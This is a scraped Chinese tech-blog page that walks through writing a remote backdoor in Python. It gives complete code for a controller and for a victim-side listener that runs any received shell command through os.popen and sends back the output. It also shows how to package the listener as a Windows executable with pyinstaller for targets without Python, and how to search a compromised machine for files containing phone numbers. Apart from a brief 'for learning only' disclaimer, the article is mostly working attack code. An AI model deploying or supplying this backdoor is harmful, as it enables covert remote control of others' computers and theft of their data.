<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>您的信息可能泄露？小心后门程序！运用Python编写后门程序 | 极客快訊</title><meta property="og:title" content="您的信息可能泄露？小心后门程序！运用Python编写后门程序 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p3.pstatp.com/large/pgc-image/24a01f51c2664c30af6ebd926670a08b"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/5114039e.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/5114039e.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/5114039e.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/5114039e.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/5114039e.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/5114039e.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/5114039e.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/5114039e.html><meta property="article:published_time" content="2020-10-29T21:12:03+08:00"><meta property="article:modified_time" content="2020-10-29T21:12:03+08:00"><meta name=Keywords content><meta name=description content="您的信息可能泄露？小心后门程序！运用Python编写后门程序"><meta name=author content="极客快訊"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/5114039e.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快讯 Geek Bank</a></h1><p class=description>为你带来最全的科技知识 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>您的信息可能泄露？小心后门程序！运用Python编写后门程序</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p><strong>注：本篇文章仅供学习交流，请勿用于非法用途。</strong></p><div class=pgc-img><img alt=您的信息可能泄露？小心后门程序！运用Python编写后门程序 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/24a01f51c2664c30af6ebd926670a08b><p class=pgc-img-caption></p></div><hr><p><strong>前言</strong></p><p>本篇文章讲解如何编写后门程序，并实践测试运行，通过后门程序查找文件。</p><p><br></p><div class=pgc-img><img alt=您的信息可能泄露？小心后门程序！运用Python编写后门程序 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/27c7134737d3465aacf31f788c54270e><p class=pgc-img-caption></p></div><hr><p><br></p><p><strong>后门基本概念</strong></p><p><br></p><p>防火墙用于拦截用户从外部访问服务器。访问服务器的Telnet、FTP等服务只限允许的用户使用。防火墙并不会阻断用户从内部向外部的访问路径。虽然很难从外部侵入防火墙，但一旦成功，黑客就能轻松窃取敏感信息。后门技术用于绕过防火墙等安全设备，掌控服务器资源。安装于目标服务器的后门客户端会接收并运行来自后门服务器的命令，并将运行结果发送给后门服务器。</p><p>利用后门发动攻击时，最困难的是向目标系统安装后门客户端。通过网络直接上传文件并非易事，所以这种手段大多用于安全性较差的Web环境。</p><p><br></p><p><strong>后门攻击端</strong></p><pre><code> import socketip = "192.168.1.10"  # 对方服务器ip地址port = 5555  # 对方服务器的端口s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 链接对方使用tcp协议 对象建立s.connect((ip, port))  # 连接while True:    data = input("请输入命令：")    data = bytes(data, encoding="utf8")    s.send(data)  # 发送数据给对方    data2 = s.recv(1024)  # 接收返回的数据    print(str(data2, encoding="utf8"))    if data == b"q":        breaks.close()</code></pre><p><br></p><p><strong>后门受攻击端</strong></p><pre><code>import socketimport osip = ""  # 空表示可连接所有主机port = 5555  # 设置端口s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 对象s 使用基于tcp协议的网络套接字s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 关闭后不需要保存状态可以立即开启s.bind((ip, port))  # 对象s 开始绑定ip和端口s.listen(10)  # 启动监听状态，设置队列中等待连接服务器的最大请求数10conn, addr = s.accept()  # 当与别人建立连接 addr,conn 变量分别存对方ip和连接的对象print(addr)  # 显示对方地址while True:    data = conn.recv(1024)  # 接收对方字符串 #如果对方不发数据会卡住    print(data)  # 打印对方发来的数据    if data == b"q":        break    data = str(data, encoding="utf8")  # 将数据转换为字符串类型    f = os.popen(data)  # 可以将命令的内容以读取的方式返回    data2 = f.read()    if data2 == "":        conn.send(b"finish")    else:        conn.send(bytes(data2, encoding="utf8"))  # 发送命令运行结果conn.close()  # 断开连接s.close()  # 关闭套结字</code></pre><p><br></p><p><strong>创建Windows可执行文件</strong></p><p><br></p><p>由于并不是所有被攻击对象都安装python环境，所以需要把python程序封装成可执行文件，</p><p>详见->https://mp.weixin.qq.com/s/Q0D1DzVPit3NX8DRWHrA2g</p><p><br></p><p>在桌面所在路径运行命令，则生成的文件就在桌面，运行下面代码，将受控端（受攻击端）封装。</p><pre><code>pyinstaller -F D:\应用程序\Python\Python代码\学习练习\后门受控端.py</code></pre><p><br></p><div class=pgc-img><img alt=您的信息可能泄露？小心后门程序！运用Python编写后门程序 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/07d6adca3a0745d0a0c2256e47c7979c><p class=pgc-img-caption></p></div><div class=pgc-img><img alt=您的信息可能泄露？小心后门程序！运用Python编写后门程序 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/b99e09adec464220bbc79675a0da07a9><p class=pgc-img-caption></p></div><p></p><p><strong>测试</strong></p><p>攻击端IP：192.168.1.5</p><p>受攻击端IP：192.168.1.10</p><p>（1）将刚才封装完成的exe文件（dist文件夹中）复制到Windows7虚拟机（受攻击端）中，双击运行，然后在攻击机中运行攻击端代码，这里我是在pycharm中运行。连接成功后，在pycharm输入命令dir，就可看到受控端exe文件所在路径下的所有文件和路径了。其中&lt;DIR>表示文件夹。(命令要使用英文)</p><p><br></p><div class=pgc-img><img alt=您的信息可能泄露？小心后门程序！运用Python编写后门程序 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/cbf7dc3eb777403893cee08a49ed45a0><p class=pgc-img-caption></p></div><div class=pgc-img><img alt=您的信息可能泄露？小心后门程序！运用Python编写后门程序 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/ccd3b9ba48844ee0a4a9d908a916bad2><p class=pgc-img-caption></p></div><p><br></p><p>（2）假设在受控端有文件中包含号码等敏感信息，我们可以输入如下命令</p><ul><li><br></li></ul><pre><code>findstr "号码" *.txt</code></pre><p>查找当前路径下的所有txt后缀名的文件中是否包含“号码”字符，也可以用如下命令指定查找的文件夹。</p><ul><li><br></li></ul><pre><code>findstr -d:新建文件夹 "号码" *.txt</code></pre><p>使用type命令打开文件，查看文件信息。</p><ul><li><br></li></ul><pre><code>type 新建文件夹\t2.txt</code></pre><div class=pgc-img><img alt=您的信息可能泄露？小心后门程序！运用Python编写后门程序 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/8f7b5e926a4943bcbd65f9ee03591e2b><p class=pgc-img-caption></p></div><div class=pgc-img><img alt=您的信息可能泄露？小心后门程序！运用Python编写后门程序 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/d09249f6a4134dd98d62171782605c5d><p class=pgc-img-caption></p></div><p>觉得不错，可以点个关注哦，持续更新中~</p><p>有问题可以评论区留言，微信公众号同名。</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'程序','泄露','后门'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>